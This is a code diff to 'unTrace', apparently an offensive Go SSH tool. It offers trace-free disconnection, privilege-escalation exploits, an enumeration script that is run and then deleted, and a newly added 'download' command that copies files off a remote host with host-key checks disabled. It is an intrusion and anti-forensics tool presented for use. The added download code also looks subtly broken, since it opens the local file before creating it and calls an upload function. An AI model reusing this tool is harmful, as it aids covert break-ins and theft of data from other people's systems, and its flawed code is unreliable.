@@ -12,25 +12,33 @@ import (
     "github.com/howeyc/gopass"
     "github.com/acarl005/stripansi"
     "os/exec"
+    "github.com/bramvdbogaerde/go-scp"
+	"github.com/bramvdbogaerde/go-scp/auth"
+    "path/filepath"
 )
 
 var escapePrompt = []byte{'$', ' '}
+
+var user = ""
+var password = ""
+var ip = ""
+var port = ""
 
 var arch = "32"
 var wget = "wget"
 
 func main() {
     fmt.Print("IP Address of remote host: ")
-    ip := readLine()
+    ip = readLine()
     fmt.Print("Port of remote host: ")
-    port := readLine()
+    port = readLine()
 
     fmt.Print("Login as: ")
-    user := readLine()
+    user = readLine()
     fmt.Print("Enter " + user + "'s password: ")
     passwordBytes, _ := gopass.GetPasswd()
 
-    password := string(passwordBytes)
+    password = string(passwordBytes)
 
     fmt.Println("Connecting to " + ip + " on port " + port + "...")
 
@@ -203,6 +211,43 @@ func readLine() string {
     return strings.TrimSpace(text)
 }
 
+func downloadFile(file string) {
+    clientConfig, _ := auth.PasswordKey(user, password, ssh.InsecureIgnoreHostKey())
+
+	// For other authentication methods see ssh.ClientConfig and ssh.AuthMethod
+
+	// Create a new SCP client
+    client := scp.NewClient(ip + ":" + port, &clientConfig)
+
+	// Connect to the remote server
+	err := client.Connect()
+	if err != nil {
+		fmt.Println("Couldn't establisch a connection to the remote server ", err)
+		return
+	}
+    
+    f, _ := os.Open("./" + filepath.Base(file))
+    if _, err := os.Stat("./" + filepath.Base(file)); os.IsNotExist(err) {
+        _, _ = os.Create("./" + filepath.Base(file))
+    }
+    
+    // Close client connection after the file has been copied
+	defer client.Close()
+
+	// Close the file after it has been copied
+	defer f.Close()
+
+	// Finaly, copy the file over
+
+	err = client.CopyFile(f, file, "0655")
+
+	if err != nil {
+		fmt.Println("Error while copying file ", err)
+	}
+    
+    fmt.Println("Successfully downloaded the file")
+}
+
 func echo(str string) string {
     temp := strings.Split(str, "\n")
     cmd := ""
@@ -234,7 +279,9 @@ var helpString = `unTrace by milan44
 
 help       Shows a list of all commands.
 vanish     Closes the ssh connection without leaving a trace.
-escalate   Shows a list of priviledge escalation exploits. Usage 'unt escalate <exploit>'.`
+escalate   Shows a list of priviledge escalation exploits. Usage 'unt escalate <exploit>'.
+enum       Collects some important information about the system in report.txt
+download   Downloads a file. (Will ask for filepath)`
 
 func handleUnt(arg string) string {
     arg = strings.Trim(arg, "\n")
@@ -304,6 +351,10 @@ rm exploit`)
 chmod +x enum.sh
 ./enum.sh -r report -e ~ -t
 rm enum.sh`)
+        case "download":
+            fmt.Print("Specify file path: ")
+            downloadFile(readLine())
+            return ""
     }
 
     return echo("Command 'unt " + arg + "' not defined! Try 'unt help'.")
